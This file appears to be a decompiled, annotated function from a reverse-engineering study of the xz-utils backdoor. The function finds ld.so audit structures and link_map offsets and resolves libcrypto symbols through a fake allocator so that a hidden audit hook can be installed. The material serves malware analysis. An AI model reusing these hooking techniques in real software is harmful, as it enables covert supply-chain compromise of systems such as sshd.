// /home/kali/xzre-ghidra/xzregh/1051E0_find_dl_audit_offsets.c
// Function: find_dl_audit_offsets @ 0x1051E0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_dl_audit_offsets(backdoor_data_handle_t * data, ptrdiff_t * libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Coordinates the entire ld.so reconnaissance pass. It resolves the necessary EC/EVP helpers via the fake allocator, copies
 * `_dl_audit_symbind_alt`’s address/size out of ld.so, and uses `find_link_map_l_name` to compute the displacement between the
 * cached and live link_map entries. With that offset it invokes `find_dl_naudit` to capture the `_dl_naudit`/`_dl_audit` pointers
 * and `find_link_map_l_audit_any_plt` to learn where the audit bit lives. Finally it copies libcrypto’s basename into
 * `hooks->ldso_ctx` so the forged `l_name` string looks correct. Any failure frees the temporary imports and aborts the audit-hook
 * install path.
 */

#include "xzre_types.h"

BOOL find_dl_audit_offsets
               (backdoor_data_handle_t *data,ptrdiff_t *libname_offset,backdoor_hooks_data_t *hooks,
               imported_funcs_t *imported_funcs)

{
  uint libname_len;
  elf_info_t *libcrypto_info;
  Elf64_Addr symbol_offset;
  Elf64_Ehdr *libcrypto_ehdr;
  elf_handles_t *elf_handles;
  u64 size;
  char **libcrypto_name_entry;
  char *libcrypto_name_bytes;
  BOOL success;
  lzma_allocator *allocator;
  Elf64_Sym *symbol_entry;
  pfn_EVP_PKEY_free_t evp_pkey_free_stub;
  pfn_EC_KEY_get0_group_t ec_group_stub;
  pfn_EVP_CIPHER_CTX_free_t cipher_ctx_free_stub;
  long copy_idx;
  uchar *audit_symbol_vaddr;
  backdoor_hooks_data_t *hooks_cursor;
  byte zero_seed;
  
  zero_seed = 0;
  success = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x0,10,0,FALSE);
  if (success != FALSE) {
    allocator = get_lzma_allocator();
    libcrypto_info = data->cached_elf_handles->libcrypto;
    allocator->opaque = libcrypto_info;
    symbol_entry = elf_symbol_get(libcrypto_info,STR_EC_POINT_point2oct,0);
    if (data->cached_elf_handles->liblzma->gnurelro_present != FALSE) {
      if (symbol_entry != (Elf64_Sym *)0x0) {
        symbol_offset = symbol_entry->st_value;
        libcrypto_ehdr = data->cached_elf_handles->libcrypto->elfbase;
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        imported_funcs->EC_POINT_point2oct = (pfn_EC_POINT_point2oct_t)(libcrypto_ehdr->e_ident + symbol_offset);
      }
      evp_pkey_free_stub = (pfn_EVP_PKEY_free_t)lzma_alloc(0x6f8,allocator);
      imported_funcs->EVP_PKEY_free = evp_pkey_free_stub;
      if (evp_pkey_free_stub != (pfn_EVP_PKEY_free_t)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      symbol_entry = elf_symbol_get(data->cached_elf_handles->libcrypto,STR_EC_KEY_get0_public_key,0);
      ec_group_stub = (pfn_EC_KEY_get0_group_t)lzma_alloc(0x7e8,allocator);
      imported_funcs->EC_KEY_get0_group = ec_group_stub;
      if (ec_group_stub != (pfn_EC_KEY_get0_group_t)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      elf_handles = data->cached_elf_handles;
      if (symbol_entry != (Elf64_Sym *)0x0) {
        symbol_offset = symbol_entry->st_value;
        libcrypto_ehdr = elf_handles->libcrypto->elfbase;
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        imported_funcs->EC_KEY_get0_public_key =
             (pfn_EC_KEY_get0_public_key_t)(libcrypto_ehdr->e_ident + symbol_offset);
      }
      symbol_entry = elf_symbol_get(elf_handles->ldso,STR_dl_audit_symbind_alt,0);
      if (symbol_entry != (Elf64_Sym *)0x0) {
        libcrypto_info = data->cached_elf_handles->ldso;
        size = symbol_entry->st_size;
        audit_symbol_vaddr = libcrypto_info->elfbase->e_ident + symbol_entry->st_value;
        (hooks->ldso_ctx)._dl_audit_symbind_alt__size = size;
        (hooks->ldso_ctx)._dl_audit_symbind_alt = (dl_audit_symbind_alt_fn)audit_symbol_vaddr;
        success = elf_contains_vaddr(libcrypto_info,audit_symbol_vaddr,size,4);
        if ((success != FALSE) &&
           (success = find_link_map_l_name(data,libname_offset,hooks,imported_funcs), success != FALSE))
        {
          cipher_ctx_free_stub = (pfn_EVP_CIPHER_CTX_free_t)lzma_alloc(0xb28,allocator);
          imported_funcs->EVP_CIPHER_CTX_free = cipher_ctx_free_stub;
          if (cipher_ctx_free_stub != (pfn_EVP_CIPHER_CTX_free_t)0x0) {
            imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          }
          success = find_dl_naudit(data->cached_elf_handles->ldso,data->cached_elf_handles->libcrypto,
                                 hooks,imported_funcs);
          if ((success != FALSE) &&
             (success = find_link_map_l_audit_any_plt(data,*libname_offset,hooks,imported_funcs),
             success != FALSE)) {
            hooks_cursor = hooks;
            for (copy_idx = 0x10; copy_idx != 0; copy_idx = copy_idx + -1) {
              (hooks_cursor->ldso_ctx)._unknown1459[0] = '\0';
              (hooks_cursor->ldso_ctx)._unknown1459[1] = '\0';
              (hooks_cursor->ldso_ctx)._unknown1459[2] = '\0';
              (hooks_cursor->ldso_ctx)._unknown1459[3] = '\0';
              hooks_cursor = (backdoor_hooks_data_t *)((long)hooks_cursor + (ulong)zero_seed * -8 + 4);
            }
            libcrypto_name_entry = (hooks->ldso_ctx).libcrypto_l_name;
            libname_len = *(uint *)(libcrypto_name_entry + 1);
            if (libname_len < 9) {
              if (libname_len != 0) {
                libcrypto_name_bytes = *libcrypto_name_entry;
                copy_idx = 0;
                do {
                  (hooks->ldso_ctx)._unknown1459[copy_idx] = libcrypto_name_bytes[copy_idx];
                  copy_idx = copy_idx + 1;
                } while ((ulong)libname_len << 3 != copy_idx);
              }
              return TRUE;
            }
          }
        }
      }
    }
    lzma_free(imported_funcs->EVP_PKEY_free,allocator);
    lzma_free(imported_funcs->EC_KEY_get0_group,allocator);
    lzma_free(imported_funcs->EVP_CIPHER_CTX_free,allocator);
  }
  return FALSE;
}

